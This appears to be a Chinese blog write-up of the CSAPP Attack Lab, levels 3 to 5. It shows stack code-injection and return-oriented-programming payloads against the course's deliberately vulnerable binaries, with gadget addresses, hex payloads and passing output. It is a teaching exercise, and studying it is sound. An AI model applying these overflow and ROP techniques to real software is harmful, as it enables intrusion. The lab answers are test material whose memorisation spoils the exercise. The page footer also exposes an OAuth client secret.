<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa: <span class="number">53</span>                    <span class="keyword">push</span>   %rbx</span><br><span class="line">  4018fb: <span class="number">48</span> <span class="number">89</span> fb              <span class="keyword">mov</span>    %rdi,%rbx</span><br><span class="line">  4018fe: c7 <span class="number">05</span> d4 2b <span class="number">20</span> <span class="number">00</span> <span class="number">03</span>  movl   <span class="number">$0</span>x3,<span class="number">0x202bd4</span>(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  <span class="number">401905</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>在 level3 中，我们的参数变成了字符串，同时由于 touch3 调用了子函数 hexmatch，尤其里面的声明和随机位置赋值，这意味着如果我们还想像 level2 一样在 rsp-0x28 处插入代码就有可能被覆盖掉。注意，我们是需要在存字符串的，一旦被覆盖了，字符串就丢失了。因此，我们换到处于更高位置的 test 帧处做字符串存储，同样的，由于 touch3 直接 exit 我们不用担心后续。</p>
<p>由于 level2 相同编译问题，我将 touch3 的入口也放到后面了，因此字符串的实际实际位置在 rsp+0x10，也就是 0x5561dcb0。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl    <span class="number">$0</span>x5561dcb0, %edi # 提供 sval</span><br><span class="line">retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>: bf b0 dc <span class="number">61</span> <span class="number">55</span>        <span class="keyword">mov</span>    <span class="number">$0</span>x5561dcb0,%edi</span><br><span class="line">   <span class="number">5</span>: c3                    retq</span><br></pre></td></tr></table></figure>
<p>通过查询 ASCII 表，我们可以得到 cookie 0x59b997fa 的字节码表示 “35 39 62 39 39 37 66 61”。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bf b0 dc <span class="number">61</span> <span class="number">55</span> c3 <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* 插入代码段 */</span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="built_in">rsp</span>-<span class="number">0x24</span> */</span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* touch3 入口 */</span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> /* 字符串，注意用 <span class="number">00</span> 结尾 */</span><br><span class="line"><span class="number">00</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@MiWiFi-R4A-srv target1]# ./hex2raw &lt; ctarget.l3.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line"> user id bovik</span><br><span class="line"> course 15213-f15</span><br><span class="line"> lab attacklab</span><br><span class="line"> result 1:PASS:0xffffffff:ctarget:3:BF B0 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<h2 id="level4">level4</h2>
<p>由于 DI 攻击方式太过常见，所以很多程序都自带针对 DI 的防御手段，比如栈随机化、栈破坏检测（通过金丝雀值）和限制可执行代码区域。但显然它们也不能做到尽善尽美，level4 和 level5 就要求我们在以上限制下重新完成 touch2 和 touch3 的骇入。</p>
<p>现在我们重新梳理 touch2，不难发现其实我们真正需要的操作是让寄存器 edi 获得 0x59b997fa。由于当前的限制条件，我们只能将其写在栈上再通过 pop 读出，且这个 pop 操作只能通过 lab 给出的 “工具代码段” 也就是 start_farm 到 end_farm 这一部分得到。</p>
<p>首先，参考实验说明的附录表格，我们知道 pop 操作是 0x58~0x5f，于是去 farm 中寻找，发现只有 58 和 5c，分别对应 popq rax 和 popq rsp，这里再次说明 q 后缀是 64 位，l 后缀是 32 位。了解二者含义都知道，我们只有一个选项那就是 popq rax，也就是说我们存储的 0x59b997fa 会被送到 rax。</p>
<p>这里我们取 addval，0x4019a7+4=0x4019ab：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7: <span class="number">8d</span> <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> [<span class="number">58</span>] <span class="number">90</span>   <span class="keyword">lea</span>    -<span class="number">0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  4019ad: c3                    retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5: c7 <span class="number">07</span> <span class="number">54</span> c2 [<span class="number">58</span>] <span class="number">92</span>   movl   <span class="number">$0</span>x9258c254,(%rdi)</span><br><span class="line">  4019bb: c3                    retq</span><br></pre></td></tr></table></figure>
<p>那么我们现在是希望该字段被送到 edi 或者 rdi，通过查找 movl 和 movq 表，再对照 farm 内容，我们找到了三条数据，由于包含”49 89 c7” 对应 “movq rax, rdi”，所以就不用再去找中转了（与之相对的，level5 需要）。</p>
<p>对比这三条，我选择了 addval，因为后面直接跟着 c3，对应汇编中的 “retq”，取 0x4019a0+2，即 0x4019a2：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0: <span class="number">8d</span> <span class="number">87</span> [<span class="number">48</span> <span class="number">89</span> c7] c3   <span class="keyword">lea</span>    -<span class="number">0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  4019a6: c3                    retq</span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae: c7 <span class="number">07</span> [<span class="number">48</span> <span class="number">89</span> c7] c7   movl   <span class="number">$0</span>xc7c78948,(%rdi)</span><br><span class="line">  4019b4: c3                    retq</span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3: c7 <span class="number">07</span> [<span class="number">48</span> <span class="number">89</span> c7] <span class="number">90</span>   movl   <span class="number">$0</span>x90c78948,(%rdi)</span><br><span class="line">  4019c9: c3                    retq</span><br></pre></td></tr></table></figure>
<p>最后，成功构造出指定输入，我用的塔式结构，也比较清晰易懂：）</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="number">40</span> 个空白字符 */</span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* 弹出目标数据给 <span class="built_in">rax</span> */</span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* 目标数据 */</span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="built_in">rax</span> 传给 <span class="built_in">rdi</span> */</span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* touch2 入口 */</span><br></pre></td></tr></table></figure>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@MiWiFi-R4A-srv target1]# ./hex2raw &lt; rtarget<span class="number">.</span>l4<span class="number">.</span>txt | ./rtarget -q</span><br><span class="line"><span class="symbol">Cookie:</span> <span class="number">0x59b997fa</span></span><br><span class="line">Type string:Touch2!: You called touch2(<span class="number">0x59b997fa</span>)</span><br><span class="line">Valid solution for level <span class="number">2</span> with target rtarget</span><br><span class="line"><span class="symbol">PASS:</span> Would have posted the following:</span><br><span class="line"> user id bovik</span><br><span class="line"> course <span class="number">15213</span>-f15</span><br><span class="line"> lab attacklab</span><br><span class="line"> result <span class="number">1</span>:PASS:<span class="number">0xffffffff</span>:rtarget:<span class="number">2</span>:<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> AB <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> FA <span class="number">97</span> B9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> A2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> EC <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
<h2 id="level5">level5</h2>
<p>首先我们先梳理一下 touch3，其核心需求是让寄存器 edi 获得我们存放字符串的起始地址，所以我们其实需要准备三个东西：字符串、touch3 入口、字符串地址。但是字符串地址我们是无法确定的，我们只能通过 rsp 间接确定其位置，于是我们的整个结构如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* <span class="number">40</span> 个空白字符 */</span><br><span class="line">/* <span class="number">1</span>. 传 <span class="built_in">rsp</span> 的位置（也就是 <span class="number">2</span>. 的位置）给寄存器 x */</span><br><span class="line">/* <span class="number">2</span>. 获取偏移给 <span class="built_in">rax</span>*/</span><br><span class="line">/* <span class="number">3</span>. 偏移 即指令 <span class="number">2</span>.~<span class="number">5</span>. 的总长度 */</span><br><span class="line">/* <span class="number">4.</span>x 加上偏移（即地址）传给 <span class="built_in">rdi</span> */</span><br><span class="line">/* <span class="number">5.</span>touch3 入口 */</span><br><span class="line">/* <span class="number">6</span>. 字符串 */</span><br></pre></td></tr></table></figure>
<p>首先，我们要找能够接收 rsp 的寄存器，也就是形如”movq rsp x“的指令（48 89 e0~7），发现只有”48 89 e0“。这里我们依然挑选最干净的第一项，它后面直接跟着 c3，得到 0x401a06。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03: <span class="number">8d</span> <span class="number">87</span> <span class="number">41</span> <span class="number">48</span> <span class="number">89</span> e0     <span class="keyword">lea</span>    -<span class="number">0x1f76b7bf</span>(%rdi),%eax</span><br><span class="line">  401a09: c3                    retq</span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47: <span class="number">8d</span> <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> e0 c7     <span class="keyword">lea</span>    -<span class="number">0x381f76b8</span>(%rdi),%eax</span><br><span class="line">  401a4d: c3                    retq</span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a: c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> e0 <span class="number">91</span>     movl   <span class="number">$0</span>x91e08948,(%rdi)</span><br><span class="line">  401a60: c3                    retq</span><br></pre></td></tr></table></figure>
<p>然后，我们要找到能将该地址和偏移地址加起来的函数，我找了半天没发现 add，但找到了另一个更贴切的 add_xy，直接用这整个函数即可，得到 0x4019d6。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6: <span class="number">48</span> <span class="number">8d</span> <span class="number">04</span> <span class="number">37</span>           <span class="keyword">lea</span>    (%rdi,%rsi,<span class="number">1</span>),%rax</span><br><span class="line">  4019da: c3                    retq</span><br></pre></td></tr></table></figure>
<p>但是我们发现它只接收 rdi 和 rsi，于是我又慢慢去找二者相关的 movq 或 movl 函数，因为涉及到中间变量相互传值，所以这是个漫长而乏味的过程。总之，最后找到了符合目标的一组传值过程，然后将之前总结的细化一下。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="keyword">movq</span> <span class="built_in">rsp</span> <span class="built_in">rax</span> 此时 <span class="built_in">rsp</span> 指向 <span class="number">2</span>.</span><br><span class="line"><span class="number">2.</span><span class="keyword">movq</span> <span class="built_in">rax</span> <span class="built_in">rdi</span></span><br><span class="line"><span class="number">3.</span><span class="keyword">pop</span> <span class="built_in">eax</span></span><br><span class="line"><span class="number">4</span>. 偏移值=<span class="number">10</span>-<span class="number">1</span>=<span class="number">9</span> 层（字符串还被 <span class="number">9</span> 条指令压着呢）所以 9x8=<span class="number">72</span> 字节</span><br><span class="line"><span class="number">5.</span>movl <span class="built_in">eax</span> <span class="built_in">edx</span></span><br><span class="line"><span class="number">6.</span>movl <span class="built_in">edx</span> <span class="built_in">ecx</span></span><br><span class="line"><span class="number">7.</span>movl <span class="built_in">ecx</span> <span class="built_in">esi</span></span><br><span class="line"><span class="number">8.</span><span class="keyword">lea</span> (<span class="built_in">rdi</span>, <span class="built_in">rsi</span>, <span class="number">1</span>) <span class="built_in">rax</span></span><br><span class="line"><span class="number">9.</span><span class="keyword">movq</span> <span class="built_in">rax</span> <span class="built_in">rdi</span></span><br><span class="line"><span class="number">10.</span>touch3</span><br><span class="line"><span class="number">11</span>. 字符串</span><br></pre></td></tr></table></figure>
<p>其中需要注意的细节就是 q 和 l 后缀，rsp 地址是 64 位的必须要用 movq，而偏移量显然可以用 32 位传递，于是拓展到 movl。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="number">40</span> 个空白字符 */</span><br><span class="line"><span class="number">06</span> 1a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="keyword">mov</span> <span class="built_in">rsp</span> <span class="built_in">rax</span> */</span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="keyword">mov</span> <span class="built_in">rax</span> <span class="built_in">rdi</span> 4019c3+<span class="number">2</span> */</span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="keyword">pop</span> <span class="built_in">rax</span> */</span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* 偏移 <span class="number">72</span>=<span class="number">0x48</span> */</span><br><span class="line"><span class="built_in">dd</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="keyword">mov</span> <span class="built_in">eax</span> <span class="built_in">edx</span> <span class="number">89</span> c2 4019<span class="built_in">db</span>+<span class="number">2</span> */</span><br><span class="line"><span class="number">70</span> 1a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="keyword">mov</span> <span class="built_in">edx</span> <span class="built_in">ecx</span> <span class="number">89</span> d1 401a6e+<span class="number">2</span> */</span><br><span class="line"><span class="number">63</span> 1a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="keyword">mov</span> <span class="built_in">ecx</span> <span class="built_in">esi</span> <span class="number">89</span> ce 401a61+<span class="number">2</span> */</span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="keyword">lea</span> (<span class="built_in">rdi</span>, <span class="built_in">rsi</span>, <span class="number">1</span>) <span class="built_in">rax</span> 4019d6 */</span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* <span class="keyword">mov</span> <span class="built_in">rax</span> <span class="built_in">rdi</span> */</span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> /* touch3 入口 4018fa */</span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> /* 字符串，注意用 <span class="number">00</span> 结尾 */</span><br><span class="line"><span class="number">00</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@MiWiFi-R4A-srv target1]# ./hex2raw &lt; rtarget.l5.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line"> user id bovik</span><br><span class="line"> course 15213-f15</span><br><span class="line"> lab attacklab</span><br><span class="line"> result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 63 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<p>1.0x90 对应于”no op“操作，所以如果我们看到这样的汇编码，又想调用”89 ce“时放心使用即可。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:  <span class="number">8d</span> <span class="number">87</span> <span class="number">89</span> ce <span class="number">90</span> <span class="number">90</span>      <span class="keyword">lea</span>    -<span class="number">0x6f6f3177</span>(%rdi),%eax</span><br><span class="line">  401a17:  c3                     retq</span><br></pre></td></tr></table></figure>
<p>2.<code>0xc3</code> 对应返回值之前有讲过</p>
<p>3. 单个字节不被看作操作，会被自动忽略，比如下面的代码，我们想要”89 d1“，由于和”c3“只间隔一个字节，中间的”91“会被忽略，即可以截取该代码段运行。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:  c7 <span class="number">07</span> <span class="number">89</span> d1 <span class="number">91</span> c3      movl   <span class="number">$0</span>xc391d189,(%rdi)</span><br><span class="line">  401a74:  c3                     retq</span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>CSAPP Lab3 Understanding Buffer Overflow Bugs</p><p><a href="https://zion4h.github.io/2022/06/03/CSAPP-LAB-3/">https://zion4h.github.io/2022/06/03/CSAPP-LAB-3/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>zion h4</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-06-03</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2025-04-19</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=641e7fdbd0e85900127dc9ed&amp;product=inline-share-buttons&amp;source=platform" defer></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/06/05/CSAPP-LAB-5/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CSAPP Lab5 Understanding Cache Memories</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/06/02/CSAPP-LAB-2/"><span class="level-item">CSAPP Lab2 Defusing a Binary Bomb</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "52f070b1233109188a0f4dd7d0f9c5f6",
            repo: "zion4h.github.io",
            owner: "zion4h",
            clientID: "6f5a7e1a8b910087187d",
            clientSecret: "24cd36d0774c992dbd5536246799438ee849c1da",
            admin: ["zion4h"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#准备"><span class="level-left"><span class="level-item">1</span><span class="level-item">准备</span></span></a></li><li><a class="level is-mobile" href="#level1"><span class="level-left"><span class="level-item">2</span><span class="level-item">level1</span></span></a></li><li><a class="level is-mobile" href="#level2"><span class="level-left"><span class="level-item">3</span><span class="level-item">level2</span></span></a></li><li><a class="level is-mobile" href="#level3"><span class="level-left"><span class="level-item">4</span><span class="level-item">level3</span></span></a></li><li><a class="level is-mobile" href="#level4"><span class="level-left"><span class="level-item">5</span><span class="level-item">level4</span></span></a></li><li><a class="level is-mobile" href="#level5"><span class="level-left"><span class="level-item">6</span><span class="level-item">level5</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/kitty.png" alt="Blowin&#039; in the Wind" height="28"></a><p class="is-size-7"><span>&copy; 2025 zion h4</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><i></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/zion4h"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
